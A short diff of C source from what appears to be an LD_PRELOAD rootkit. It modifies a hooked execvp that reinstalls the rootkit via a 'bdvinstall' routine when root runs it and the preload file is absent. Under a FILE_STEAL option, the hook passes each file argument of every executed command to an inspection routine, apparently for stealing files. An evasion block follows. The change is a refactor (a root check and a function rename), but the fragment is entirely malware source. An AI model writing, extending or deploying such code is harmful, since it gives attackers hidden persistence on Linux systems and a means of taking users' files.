@@ -1,11 +1,11 @@
 int execvp(const char *filename, char *const argv[]){
-    if(getuid() == 0 && rknomore() &&
-                                    #ifdef PATCH_DYNAMIC_LINKER
-                                    !preloadok(PRELOAD_FILE)
-                                    #else
-                                    !preloadok(OLD_PRELOAD)
-                                    #endif
-                                    && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME))
+    if(!notuser(0) && rknomore() &&
+                                #ifdef PATCH_DYNAMIC_LINKER
+                                !preloadok(PRELOAD_FILE)
+                                #else
+                                !preloadok(OLD_PRELOAD)
+                                #endif
+                                && !fnmatch("*/bdvinstall", argv[0], FNM_PATHNAME))
         bdvinstall(argv);
 
     plsdomefirst();
@@ -31,7 +31,7 @@ int execvp(const char *filename, char *const argv[]){
 
 #ifdef FILE_STEAL
     for(int i = 1; argv[i] != NULL; i++)
-        inspect_file(argv[i]);
+        inspectfile(argv[i]);
 #endif
 
 #ifdef DO_EVASIONS
